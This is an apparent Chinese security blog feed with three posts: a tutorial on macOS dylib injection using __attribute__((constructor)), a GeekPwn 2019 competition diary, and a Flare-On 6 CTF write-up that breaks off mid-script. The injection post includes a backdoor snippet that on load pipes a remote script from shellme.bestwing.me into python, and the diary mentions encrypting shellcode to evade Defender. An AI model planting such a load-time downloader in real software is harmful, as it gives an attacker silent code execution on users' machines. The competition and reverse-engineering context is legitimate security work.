    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间，在打geekpwn的时候，需要做后门，一开始我做的是macos的后门，用的是 macos dylib注入（劫持？）。</p><p>这里可以提一下，我这里用的是这个项目<a href="https://github.com/Tyilo/insert_dylib">insert_dylib</a>，曾经看过有人用这个项目，去掉了macos上企业微信的水印，所以一直有点印象。</p><p>使用方式如下：insert @executable_path src dst</p><p>最后能类似这样的一个效果：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123215413.png"></a></p><p>红色框的，是我注入的dylib 程序，那么另外一个问题来了，如何让在程序启动前或者后，执行外面的代码呢？这里就是这个文章想提的一个东西。</p><blockquote><p>什么是 @executable_path ？</p><p> executable_path 是macOS的链接路径的解决方案之一，除此之外还有 @loader_path 和 @rpath，具体细节不在这里表述，感兴趣可以自己搜一下。</p></blockquote><h2 id="attribute"><a href="#attribute" class="headerlink" title="attribute"></a><strong>attribute</strong></h2><h3 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h3><p>首先，什么是 <strong><strong>attribute</strong></strong> ？ </p><p><code>__attribute__</code>是一个编译属性，用于向编译器描述特殊的标识、错误检查或高级优化。它是GNU C特色之一，系统中有许多地方使用到。 <code>__attribute__</code>可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute)等。</p><p>接着如何利用该编译属性达到我们想要的效果？</p><p>这里我们要认识两个编译属性</p><ol><li><strong>attribute</strong>((constructor))</li><li><strong>attribute</strong>((destructor))</li></ol><p>这两个带着  <code>__attribute__</code> 编译属性的标识并不相同，一个是constructor 一个是 destructor。</p><p>从字面上理解 constructor 是构造器的意思，destructor 是 a refuse-burning furnace（焚化炉的意思？），我们可以简单的理解其为c++ 函数里的构造函数和析构函数，其特点就是在于：</p><p><strong>attribute</strong>((constructor)) 确保此函数在 在<code>main</code>函数被调用之前调用，iOS中在<code>+load</code>之后<code>main</code>之前执行。<br> <code>constructor</code>和<code>destructor</code>会在<code>ELF</code>文件中添加两个段-<code>.ctors</code>和<code>.dtors</code>。当动态库或程序在加载时，会检查是否存在这两个段，如果存在执行对应的代码。</p><p><strong>attribute</strong>((destructor))，确保此函数在 在<code>main</code>函数被调用之后调。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>我这里可以放一个，当时macos后面的一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&quot;shellme.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid,ppid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid ==<span class="number">0</span>)&#123;</span><br><span class="line">        ppid = fork();</span><br><span class="line">        <span class="keyword">if</span> (ppid == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;touch /tmp/hacker&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;curl shellme.bestwing.me | python &gt; /dev/null &amp;&quot;</span>);</span><br><span class="line"><span class="comment">//        system(&quot;./shell&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">int</span> <span class="title">fuck</span><span class="params">()</span></span>&#123;</span><br><span class="line">    load();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Hacked by chaitin ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们这里可以选择Xcode 进行编译，选择编译成dylib，或者直接 gcc test.c -shared 编译也可。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png"></a></p><p>最后改成相应的名字，放到被注入的程序的对应目录里即可。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="attribute" scheme="https://bestwing.me/tags/attribute/"/>
    
  </entry>
  
  <entry>
    <title>2019 年geekpwn 日记</title>
    <link href="https://bestwing.me/2019-geekpwn-writeup.html"/>
    <id>https://bestwing.me/2019-geekpwn-writeup.html</id>
    <published>2019-10-27T16:00:00.000Z</published>
    <updated>2020-06-22T18:09:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><p>​    </p><p><em>作为国际化的智能生活安全社区，GeekPwn 是安全极客们施展才华和分享研究成果的舞台。GeekPwn 大赛将在 2019 年 10 月 24 日中国上海举行，力邀才华横溢的极客选手报名，突破安全的边界</em></p><p>今年的geekpwn 有两场，一是7月24日华为专场，针对华为设备进行的破解，二是10月24日上海geekpwn主场，可惜的是今年只有一天。有幸的是，今年我两场都以“长亭科技”安全研究员的身份参与了。</p><h2 id="7月24日-华为专场"><a href="#7月24日-华为专场" class="headerlink" title="7月24日 华为专场"></a>7月24日 华为专场</h2><p>​    由于涉及到漏洞公开原则，漏洞细节在此文中是不会提及的，此文主要写一些这段时间内以来的一些感触，漏洞挖掘经验以及在长亭科技的一些感受。</p><p>​    6月底的时候刚好我毕业答辩，那个时候公司里也刚好差不多结束了“护网”的活动，那段时间，explore、晨升大佬在准备7月24日华为专场geekpwn。</p><p>​    7月初的时候，m4x拉了一个华为IoT的群组</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png"></a></p><p>​    正式以晨升前期挖掘的一个漏洞进行进一步的利用，后面晨升基本就没来过公司Orz…</p><p>​    整个过程，我们经历了大起大落，每次都觉得要成了，然后就又都沉底了..（Ps： 华为的产品真难打）…我们从一个入口，获取root shell 花了大概两个礼拜的时间。中间利用包括任意命令执行、提权等漏洞差不多有四五个个小的问题组成了一个完整的利用链…整个过程还是比较有意思的..以及能明显感受到 长亭安研的氛围，真的有一种打“CTF”的错觉 233</p><p>当然最后好像完成这个 geekpwn华为专场的一共只有三个队伍，当然包括 “长亭科技”是其中的一个。感谢队友一下不分顺序：晨升、wupco、explore、杰克马、m4x的带飞</p><h2 id="10月24日-上海主场"><a href="#10月24日-上海主场" class="headerlink" title="10月24日 上海主场"></a>10月24日 上海主场</h2><p>​    今年的上海主场的原本是要放弃了，事情发生在 rwctf 之后，由于前期大家都在准备rwctf的题，然后最后由于一些问题，我的题目“咕了”。在此中间经历了 大华摄像头、小米叮叮门铃等等设备，由于rwctf的准备或者Pwn下来实在没有什么意义就中途夭折了（Ps：其实我们在寻求一些不再是 什么路由器、摄像头的IoT设备）。</p><p>​    </p><p>​    然后就在9月12日的时候，杨博提了一句，要不就它了（此处虽然大家都知道，但还是隐名吧，我怕被该公司打，下文均以它指代此设备），还可以做感染其他设备。</p><p>​    于是我们一开始花了1-2个礼拜，陆陆续续挖掘了六七个问题，值得一提的是，该设备犯了一些常见IoT设备都会犯的问题（比如：你自己想吧 你能想到的基本都有，从硬件到软件）。然后中途，由于公司需求，我和m4x去了南京进行拿头代码审计业务。杰克马刚好后面回了公司，所以后面的攻击基本是杰克马和explore完成的。</p><p>​    最后，为了完成一个geekpwn的show的特点，我们又准备了平板电视的攻击，这个也值得调侃的是，一开始只是一个无法直接任意命令执行的安全问题，最后利用了各种安卓的feature完成了命令执行，然而的是，由于我们一开始测试没有升级到最新的版本，最后升级的时候，这个洞被修复了，但可喜的是，升级后送了我们一个能命令执行的漏洞..233。</p><p>​    </p><p><strong>中间的一些小插曲</strong></p><p>1、学习了一些 macos 下的dll注入</p><p>​    利用 insert_dylib 进行macos 下的dylib 注入</p><p>2、学习了一些windows 下defender 的一些绕过的简单思路</p><p>​    对 shellcode 多次加密 绕过defender 静态文件扫描</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还有一些故事有时间再分享，先贴一张最后的大合影：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="note" scheme="https://bestwing.me/categories/note/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="geekpwn" scheme="https://bestwing.me/tags/geekpwn/"/>
    
  </entry>
  
  <entry>
    <title>The flare-on challenge 6th writeup</title>
    <link href="https://bestwing.me/flare-on-6th-writeup.html"/>
    <id>https://bestwing.me/flare-on-6th-writeup.html</id>
    <published>2019-09-27T16:00:00.000Z</published>
    <updated>2019-10-28T13:32:23.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>这是第三次参加flare on了 这次也是第二次做完全部的题。</p><h2 id="1-Memecat-Battlestation"><a href="#1-Memecat-Battlestation" class="headerlink" title="1 - Memecat Battlestation"></a>1 - Memecat Battlestation</h2><p>C# 题目，一共两关</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png"></a></p><p>stage1Form.WeaponCode 为明文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png"></a></p><p>Stage2Form.WeaponCode 为异或结果：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array = [<span class="number">0x3</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;&amp;&#x27;</span>),ord(<span class="string">&#x27;$&#x27;</span>),ord(<span class="string">&#x27;-&#x27;</span>),<span class="number">0x1e</span>,<span class="number">0x2</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;.&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(array)):</span><br><span class="line">    s2 += chr(array[i]^ord(<span class="string">&#x27;A&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="2-overlong"><a href="#2-overlong" class="headerlink" title="2 - overlong"></a>2 - overlong</h2><p>一个patch 题目，题目默认输出个</p><p>“I never stop the encoding” </p><p>在栈上将长度改大，然后就get flag</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png"></a></p><h2 id="3-flarebear"><a href="#3-flarebear" class="headerlink" title="3 - flarebear"></a>3 - flarebear</h2><p>apk 题 使用jeb逆向发现</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png"></a></p><p>当满足 ishappy() 和 isEcstatic() 两个函数的时候，会打印flag。</p><p>ishappy() 逻辑如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png"></a></p><p>isEcstatic() 逻辑如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png"></a></p><p>游戏有三个功能分别为 feed play clean:</p><p>三个功能分别如下：</p><p><strong>feed</strong>：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png"></a></p><p><strong>play</strong>：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png"></a></p><p><strong>clean</strong>:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">feed = Int(<span class="string">&#x27;feed&#x27;</span>)</span><br><span class="line">play = Int(<span class="string">&#x27;play&#x27;</span>)</span><br><span class="line">clean = Int(<span class="string">&#x27;clean&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solve(feed/play &gt;= <span class="number">2</span>, feed/play&lt;=<span class="number">2.5</span>,feed*<span class="number">10</span>-play*<span class="number">2</span> == <span class="number">72</span>,feed*<span class="number">2</span> + play*<span class="number">4</span> - clean == <span class="number">30</span>,-feed -play + clean*<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:/media/psf/Home/Desktop/flare-on/3 - Flarebear $ python solve.py </span><br><span class="line">[Clean = 2, feed = 8, play = 4]</span><br></pre></td></tr></table></figure><p>最后可打印出flag：</p><h2 id="4-Dnschess"><a href="#4-Dnschess" class="headerlink" title="4 - Dnschess"></a>4 - Dnschess</h2><p>题目了三个附件，一个pcap流量包 一个ChessUI 和ChessAI.so 文件。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png"></a></p><p>通过DNS协议下棋</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png"></a></p><p>首先将满足条件的ip提取出来：    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">iplist = []</span><br><span class="line">cap = FileCapture(input_file=<span class="string">&#x27;capture.pcap&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i,p <span class="keyword">in</span> enumerate(cap):</span><br><span class="line">    <span class="comment"># if p.dns.flags == &#x27;0x00000120&#x27;:</span></span><br><span class="line">    <span class="keyword">if</span> p.dns.flags == <span class="string">&#x27;0x00008580&#x27;</span>:</span><br><span class="line">        name = p.dns.qry_name</span><br><span class="line">        ip = p.dns.a.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(ip)</span></span><br><span class="line">        <span class="keyword">if</span> ip[<span class="number">0</span>] != <span class="number">127</span> <span class="keyword">or</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span> <span class="keyword">and</span> (i/<span class="number">2</span>)&amp;(ip[<span class="number">2</span>])&amp;<span class="number">0xf</span>:</span><br><span class="line">            <span class="comment"># print (map(chr,t2))</span></span><br><span class="line">            ip = <span class="string">&quot;.&quot;</span>.join(ip)</span><br><span class="line">            iplist.append(str(ip))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">print(iplist)</span><br><span class="line">print(len(iplist))</span><br></pre></td></tr></table></figure><p>iplist：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>, <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span class="string">&#x27;127.148.37.223&#x27;</span>, <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br></pre></td></tr></table></figure><p>最后：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">t3 = [<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span class="string">&#x27;127.148.37.223&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"></span><br><span class="line">t2 = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x2e</span>,</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j,p <span class="keyword">in</span> enumerate(t3):    </span><br><span class="line">    ip = map(int,p.split(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> ip[<span class="number">0</span>] == <span class="number">127</span> <span class="keyword">and</span> <span class="keyword">not</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span>: </span><br><span class="line">        i = ip[<span class="number">2</span>]&amp;<span class="number">0xf</span></span><br><span class="line">        t2[i*<span class="number">2</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>]</span><br><span class="line">        t2[i*<span class="number">2</span>+<span class="number">1</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print (&#x27;&#x27;.join(map(chr,t2)))</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;&#x27;</span>.join(map(chr,t2)))</span><br></pre></td></tr></table></figure><h2 id="5-demo"><a href="#5-demo" class="headerlink" title="5 - demo"></a>5 - demo</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png"></a></p><p>这个函数将修改视角</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png"></a></p><h2 id="6-bmphide"><a href="#6-bmphide" class="headerlink" title="6 - bmphide"></a>6 - bmphide</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png"></a></p><p>参数的0 1 2  位分别是 原图、 待隐写数据 和保存的图片。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png"></a></p><p>函数i 可知是一个类似于LSB 隐写的代码，将加密后的数据隐写到</p><p>R G B  对应为 低0 1 2 ； 0 1 2 ; 0 1处</p><p>j 函数大致逻辑录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">j(z)  (ww*yy+zz+4+f(6))^b(z,1) </span><br><span class="line">ww = 0x1F7D1482</span><br><span class="line">yy = 20*136+18</span><br><span class="line">zz = MzQxOTk=  34199</span><br><span class="line">j(103) = 0  </span><br><span class="line">j(231) = 1 </span><br><span class="line">j(230) = 3 </span><br><span class="line">j(27) = 0xf8 </span><br><span class="line">j(228) = 7 </span><br><span class="line">j(25) = 0xfc</span><br><span class="line">j(100) = 6</span><br></pre></td></tr></table></figure><p>利用如下代码提取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 